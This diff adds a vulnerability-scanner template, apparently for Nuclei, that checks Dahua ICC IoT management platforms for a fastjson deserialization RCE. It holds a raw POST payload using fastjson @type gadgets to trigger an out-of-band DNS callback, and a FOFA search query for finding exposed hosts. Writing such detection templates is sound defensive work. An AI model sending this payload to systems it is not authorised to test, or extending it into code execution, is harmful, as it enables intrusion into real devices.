@@ -1,0 +1,34 @@
+http:
+- matchers:
+  - part: interactsh_protocol
+    type: word
+    words:
+    - dns
+  raw:
+  - "POST /evo-runs/v1.0/auths/sysusers/random HTTP/1.1\nHost: {{Hostname}}\nContent-Type:\
+    \ application/json\n\n{\n  \"a\":{\n      \"@type\":\"com.alibaba.fastjson.JSONObject\"\
+    ,\n      {\"@type\":\"java.net.URL\",\"val\":\"http://{{interactsh-url}}\"}\n\
+    \  }\"\"\n}\n"
+id: dahua-icc-fastjson-rce
+info:
+  author: Co5mos
+  description: "\u5927\u534EICC\u667A\u80FD\u7269\u8054\u7EFC\u5408\u7BA1\u7406\u5E73\
+    \u53F0\u662F\u4E13\u95E8\u4E3A\u5927\u534E\u80A1\u4EFD\u7814\u53D1\u7684\u4E00\
+    \u6B3E\u7269\u8054\u7F51\u7BA1\u7406\u5E73\u53F0\uFF0C\u5B83\u53EF\u4EE5\u5BF9\
+    \u591A\u4E2A\u667A\u80FD\u8BBE\u5907\u548C\u7CFB\u7EDF\u8FDB\u884C\u7EDF\u4E00\
+    \u7BA1\u7406\u548C\u63A7\u5236\uFF0C\u65B9\u4FBF\u7528\u6237\u5B9E\u65F6\u4E86\
+    \u89E3\u548C\u7BA1\u7406\u5404\u4E2A\u8BBE\u5907\u548C\u7CFB\u7EDF\u7684\u72B6\
+    \u6001\u3002\u8BE5\u5E73\u53F0\u63D0\u4F9B\u4E86\u4E00\u7CFB\u5217\u7684\u667A\
+    \u80FD\u5316\u529F\u80FD\uFF0C\u5305\u62EC\u8BBE\u5907\u7BA1\u7406\u3001\u76D1\
+    \u63A7\u9884\u8B66\u3001\u6570\u636E\u5206\u6790\u7B49\uFF0C\u65E8\u5728\u4E3A\
+    \u7528\u6237\u63D0\u4F9B\u66F4\u52A0\u667A\u80FD\u3001\u9AD8\u6548\u548C\u4FBF\
+    \u6377\u7684\u7269\u8054\u7F51\u7BA1\u7406\u4F53\u9A8C\uFF0C\u5176\u4F7F\u7528\
+    \u4E86alibaba fastjson\uFF0C\u5B58\u5728\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\u5BFC\
+    \u81F4RCE\u3002\n"
+  metadata:
+    fofa-query: "body=\"*\u5BA2\u6237\u7AEF\u4F1A\u5C0F\u4E8E800*\" || icon_hash=\"\
+      -1935899595\""
+  name: "\u5927\u534EICC\u667A\u80FD\u7269\u8054\u7EFC\u5408\u7BA1\u7406\u5E73\u53F0\
+    \u5B58\u5728fastjson\u6F0F\u6D1E"
+  severity: critical
+  tags: dahua,fastjson,rce
